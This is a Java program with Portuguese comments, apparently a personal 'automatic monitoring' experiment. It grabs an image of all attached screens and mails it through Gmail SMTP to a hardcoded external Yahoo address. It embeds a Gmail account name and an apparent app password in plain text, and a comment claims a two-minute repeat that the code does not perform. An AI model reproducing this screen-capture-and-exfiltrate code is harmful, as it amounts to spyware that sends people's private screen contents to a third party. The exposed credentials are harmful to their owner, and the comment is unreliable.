package br.com.thor;

import jakarta.activation.DataHandler;
import jakarta.mail.Authenticator;
import jakarta.mail.Message;
import jakarta.mail.PasswordAuthentication;
import jakarta.mail.Session;
import jakarta.mail.Transport;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeBodyPart;
import jakarta.mail.internet.MimeMessage;
import jakarta.mail.internet.MimeMultipart;
import jakarta.mail.util.ByteArrayDataSource;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Properties;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main {

    static void main() {
        // Cria um agendador de tarefas para manter o aplicativo rodando
        ScheduledExecutorService agendador = Executors.newSingleThreadScheduledExecutor();
        System.out.println("Iniciando a rotina de monitoramento automático...");

        // Configura para rodar imediatamente (0) e repetir a cada 2 minutos
        agendador.schedule(() -> {
            try {
                System.out.println("Executando captura agendada...");
                tirarPrint();
            } catch (Exception e) {
                System.err.println("Erro durante a execução da rotina: " + e.getMessage());
            }
        }, 0, TimeUnit.SECONDS);
    }

    public static void tirarPrint() throws AWTException {
        var ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        var limitesTotaisdaTela = new Rectangle();

        for (GraphicsDevice tela : ge.getScreenDevices()) {
            limitesTotaisdaTela = limitesTotaisdaTela.union(tela.getDefaultConfiguration().getBounds());
        }

        var robot = new Robot();
        var capturaDeTela = robot.createScreenCapture(limitesTotaisdaTela);

        enviarPrintPorEmail(capturaDeTela);
    }

    public static void enviarPrintPorEmail(BufferedImage capturaDeTela) {
        System.out.println("Mandando e-mail...");
        Thread.ofVirtual().start(() -> {
            String host = "smtp.gmail.com";
            String porta = "465";
            String usuario = "geraldof.neto2016@gmail.com";

            // ATENÇÃO: Use uma "Senha de Aplicativo" gerada no painel da sua Conta Google,
            // e não a sua senha comum de login do Gmail, senão o servidor recusará a conexão.
            String senha = "ubnz kswz qnit krcn";

            var props = new Properties();
            props.put("mail.smtp.host", host);
            props.put("mail.smtp.port", porta);
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.localhost", "localhost"); // Evita o erro do nome "Gegé-PC"

// Protocolos de segurança específicos para a porta 465 funcionarem no Java moderno
            props.put("mail.smtp.socketFactory.port", porta);
            props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
            props.put("mail.smtp.socketFactory.fallback", "false");
            props.put("mail.smtp.ssl.protocols", "TLSv1.2 TLSv1.3");

            var session = Session.getInstance(props, new Authenticator() {
                @Override
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(usuario, senha);
                }
            });
            //session.setDebug(true);

            try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
                ImageIO.write(capturaDeTela, "PNG", baos);
                var imageBytes = baos.toByteArray();

                var message = new MimeMessage(session);
                message.setFrom(new InternetAddress(usuario));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("heberthgd@yahoo.com.br"));
                message.setSubject("Captura de Tela Automatizada");

                var corpoTexto = new MimeBodyPart();
                corpoTexto.setText("""
                        deu certo gordinho????
                        """);

                var anexoImagem = new MimeBodyPart();
                var ds = new ByteArrayDataSource(imageBytes, "image/png");
                anexoImagem.setDataHandler(new DataHandler(ds));
                anexoImagem.setFileName("captura.png");

                var multipart = new MimeMultipart();
                multipart.addBodyPart(corpoTexto);
                multipart.addBodyPart(anexoImagem);
                message.setContent(multipart);

                Transport.send(message);
                System.out.println("E-mail enviado com sucesso via Virtual Thread!");

            } catch (Exception e) {
                System.err.println("Falha ao processar ou enviar o e-mail: " + e.getMessage());
                e.printStackTrace();
            } finally {
                System.exit(0);
            }
        });
    }
}